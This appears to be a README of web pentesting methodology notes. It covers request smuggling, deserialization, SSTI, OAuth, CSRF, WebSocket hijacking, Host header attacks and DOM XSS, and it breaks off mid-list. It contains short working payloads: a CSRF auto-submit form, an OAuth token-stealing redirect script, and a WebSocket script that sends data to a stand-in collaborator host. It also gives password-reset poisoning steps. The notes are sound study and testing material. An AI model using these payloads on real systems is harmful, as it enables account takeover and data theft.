<h1 align="center">⚔️ Advanced Testing Techniques</h1>
<p align="center"><b>Request smuggling, deserialization, SSTI, OAuth, CSRF, WebSockets, Host Header attacks, advanced XSS</b></p>

<p align="center">
  <img src="https://img.shields.io/badge/Type-Methodology-blue?style=for-the-badge" alt="Type">
  <img src="https://img.shields.io/badge/Level-Advanced-red?style=for-the-badge" alt="Level">
</p>

---

## 📡 HTTP Request Smuggling

1. Right-click the target (FQDN) → **Smuggle Probe**.
2. If an issue is found, open it → **Request 1** tab → select **CL.TE** or **TE.CL**.
   (If found on multiple directories, expand and pick the correct path.)
3. Edit the prefix to match the payload requirements.
4. Launch the attack.

---

## 📦 Deserialization

### Black-box

1. Identify the language the app is written in, and how it serializes data:
   - **PHP:** `O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
   - **Java:** object starts with `ac ed` (hex) or `rO0` (base64)
2. Find serialized data that the user can control.
3. Choose an attack method:
   - Edit the object directly in its byte-stream form
   - Write a script in the target language to build your own serialized object
   - Use an existing tool:
     - **PHP — PHPGGC:** function calls such as `exec`/`system`
       `./phpggc [PAYLOAD] [PARAMETERS] | base64 -w 0 | xclip -selection clipboard`
       Add the encoded payload and the secret key (from `phpinfo()`) to a SHA1-HMAC generator.
     - **Java — ysoserial:** URL-encode the whole payload when sending it through a vulnerable cookie.

### White-box

Search the source code for:
- **PHP:** `serialize()` / `unserialize()`
- **Java:** `java.io.Serializable` / `readObject()` / `InputStream`

---

## 🧬 Prototype Pollution

1. Identify the vulnerability with a payload or scanner.
2. Find vulnerable gadgets (check Fingerprint.js, Wappalyzer, BuiltWith for the libraries in use).
3. If no gadget is found, check the **Untrusted-Types** plugin in DevTools Console.

---

## 🖋️ Server-Side Template Injection (SSTI)

1. Identify the vulnerability:
   - Reflected input with no XSS signal (no encoded tags, no error) → try breaking out with templating syntax, e.g. `?greeting=data.username}}<tag>`. If nothing changes, the syntax may be wrong or the page isn't vulnerable.
   - Use a math-operation payload, e.g. `?greeting=${7*7}`, and check if the response shows `49`.
2. Identify the template engine (use PortSwigger's SSTI decision tree).
3. Exploit the vulnerability.

---

## 🔐 OAuth

### Authorization Code flow

| Step | What happens | Common parameters |
|:-:|---|---|
| 1 | Authorization request | `redirect_uri`, `response_type`, `scope`, `state` |
| 2 | User consent | — |
| 3 | Authorization code grant (vulnerable to CSRF) | `code`, `state` |
| 4 | Access token request | `client_secret`, `grant_type`, `client_id`, `redirect_uri`, `code` |
| 5 | Access token granted | Bearer token returned |
| 6 | API call | `Authorization` header with Bearer token |
| 7 | Resource granted | Sensitive data returned |

### Recon

1. Search traffic for OAuth parameters: `client_id`, `redirect_uri`, `response_type`, `state`.
2. Check well-known endpoints: `/.well-known/oauth-authorization-server`, `/.well-known/openid-configuration`.
3. Identify the grant type from `response_type`:
   - `code` → Authorization Code
   - `token` → Implicit (common in SPAs and desktop apps)

### Common misconfigurations

- **Implicit:** data in the POST request isn't validated when the session is established.
- **Authorization Code:** missing `state` parameter → CSRF (most impactful for account linking).
- **Both:** stealing the `code`/`token` through `redirect_uri`. Redirect possibilities to test:
  1. Any domain
  2. Any subdomain
  3. Specific domains
  4. One domain, all paths
  5. One domain, specific paths
  6. One domain, one path
  7. Whitelisted domains/paths based on regex
  8. Adding parameters (any / specific / none allowed)

  > Try parameter pollution, SSRF/CORS bypass tricks, `localhost.evil-server.net`, etc.
  > If `redirect_uri` is sent along with the code/token, the server is likely not vulnerable.

  Stealing data from a hash fragment:
  ```html
  <script>
    if (document.location.hash) {
      window.location = '/?' + document.location.hash.substr(1);
    }
  </script>
  ```

- **Scope upgrade:**
  - *Authorization Code:* register a malicious app → victim approves a limited scope → the app requests an expanded scope at `/token`. If the server doesn't re-validate scope, the new token has wider access.
  - *Implicit:* steal the access token, then manually request it with an expanded scope.
- **Account takeover:** sign up using the victim's email.

### OpenID Connect (on top of OAuth)

- Uses a JWT (`id_token`).
- Keys may be exposed at `/.well-known/jwks.json`.
- Configuration may be exposed at `/.well-known/openid-configuration`.
- Can combine with normal grant types, e.g. `response_type=id_token token` or `id_token code`.
- Check for **dynamic client registration** (does it need auth, like a Bearer token?) and try crafting a malicious registration payload for SSRF.

---

## 🎭 CSRF

**Three conditions to check:**
1. A relevant action the attacker wants to trigger
2. Cookie-based session handling (not Authorization headers)
3. No unpredictable request parameters (no CSRF token, no current-password check)

**Custom PoC page:**
```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Burp shortcut:** select the request → right-click → **Engagement Tools** → **Generate CSRF PoC** → customize → host it (e.g. on a cloud instance).

---

## 🔌 WebSockets

- Burp intercepts WebSocket messages just like HTTP. Set Client-to-Server or Server-to-Client in the Options tab.
- **Manipulating the handshake:** useful because it expands the attack surface, though it may close the connection or expire the token.
  1. Burp Repeater → pencil icon next to the WebSocket URL
  2. Clone or reconnect
  3. Edit the connection
  4. Click Connect to start the handshake
- **Design flaws to look for:** misplaced trust in HTTP security headers, flaws in session handling, expanded surface via custom headers.
- **Cross-Site WebSocket Hijacking (CSWSH):** look for a handshake with no CSRF token, where the session relies only on a cookie. Note that `Sec-WebSocket-Key` does **not** handle authentication.
  ```html
  <script>
    websocket = new WebSocket('wss://your-websocket-URL')
    websocket.onopen = start
    websocket.onmessage = handleReply
    function start(event) { websocket.send("READY"); }
    function handleReply(event) {
      fetch('https://your-collaborator-domain/?' + event.data, { mode: 'no-cors' })
    }
  </script>
  ```

---

## 🌐 HTTP Host Header Attacks

**Why multiple apps share one IP:**
- Virtual hosting (one owner or many owners / SaaS)
- Traffic routed through a load balancer, reverse proxy, or CDN

**Normal flow:** browser resolves the domain via DNS → sends the request to that IP with a `Host` header → the server routes it to the matching app based on that header.

**Possible impact:** web cache poisoning, business logic flaws, SSRF, client-side bugs (XSS, SQLi, HTMLi).

### Testing

- Send an **arbitrary domain** in the Host header. If the app still loads, the server may default to your target app for unrecognized hosts.
- If blocked, check: does it say "Invalid Host header"? Is a non-numeric port accepted (`Host: site.com:bad-stuff-here`)? Can the header be manipulated for SSRF?
- Send **duplicate Host headers** (often blocked, not always).
- Send an **absolute URL** in the request line with a different Host header.
- Try **extra spacing** before a header to slip past a filter.
- Combine with **request smuggling**.
- Try alternate headers: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded` (Burp's Param Miner can help guess more).

### Exploiting: Password Reset Poisoning

1. Get the victim's email or username.
2. Submit the password-reset form with the Host header set to an attacker-controlled domain.
3. The victim receives a reset email containing the poisoned URL.
4. The victim (or an automated system) opens the link, sending the token to the attacker's server.
5. The attacker uses the stolen token on the real site to reset the password.

> If the reset link can't be manipulated directly, try HTML injection in the email body instead.

---

## 🧾 Advanced XSS

Reference: PortSwigger's [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### Three types
- **Reflected** — payload comes from the current request
- **Stored** — payload comes from the application's database
- **DOM-based** — the bug is in client-side code

### DOM-based XSS

A vulnerable page takes user-controlled data (a **source**) and passes it to a function that can run dynamic code (a **sink**).

<details>
<summary><b>Common sources</b></summary>

`window.location`, `location.search`, `location.hash`, `document.URL`, `document.documentURI`, `document.URLUnencoded`, `document.baseURI`, `document.cookie`, `document.referrer`, `window.name`, `history.pushState`, `history.replaceState`, `localStorage`, `sessionStorage`, `IndexedDB`
</details>

<details>
<summary><b>Common sinks</b></summary>

`document.write()`, `document.writeln()`, `document.domain`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `onevent` handlers, jQuery's `add()`, `after()`, `append()`, `animate()`, `attr()`, `insertAfter()`, `insertBefore()`, `before()`, `html()`, `prepend()`, `replaceAll()`, `replaceWith()`, `wrap()`,
